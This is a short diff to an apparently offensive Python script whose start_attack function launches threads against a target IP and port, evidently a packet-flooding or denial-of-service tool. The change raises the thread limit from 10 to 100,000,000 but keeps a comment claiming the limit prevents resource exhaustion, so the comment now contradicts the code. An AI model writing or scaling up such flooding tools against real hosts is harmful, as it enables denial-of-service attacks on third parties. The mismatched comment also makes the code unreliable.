@@ -17,7 +17,7 @@ def start_attack(target_ip, target_port, packet_count):
                 print(f"Error in thread: {e}")
 
     threads = []
-    max_threads = 10  # Limit the number of threads to prevent resource exhaustion
+    max_threads = 100000000  # Limit the number of threads to prevent resource exhaustion
     for _ in range(max_threads):
         thread = threading.Thread(target=attack_thread)
         thread.start()
